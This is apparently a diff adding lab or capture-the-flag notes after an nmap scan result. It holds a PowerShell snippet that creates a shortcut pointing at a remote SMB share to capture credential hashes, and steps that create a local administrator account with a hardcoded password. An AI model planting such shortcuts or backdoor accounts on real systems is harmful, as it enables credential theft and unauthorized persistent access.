@@ -561,3 +561,34 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 703.98 seconds
 
 ```
+
+
+
+
+```
+$objShell = New-Object -ComObject WScript.shell
+$lnk = $objShell.CreateShortcut("C:\test.lnk")
+$lnk.TargetPath = "\\10.10.10.25\@test.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Test"
+$lnk.HotKey = "Ctrl+Alt+T"
+$lnk.Save()
+```
+
+
+
+
+```
+a Select “Users”, then right click in the user panel and select “New User”.
+b Enter the username of “cds” and password of “OpenLab123”
+c Unselect “User must change password at next login” and select “User
+cannot change password”
+d Once complete, select “Groups”, right click on “Administrators” and select
+“Add to group”.
+e Add the “cds” user to the administrators group and hit apply
+
+
+
+*********************
+```
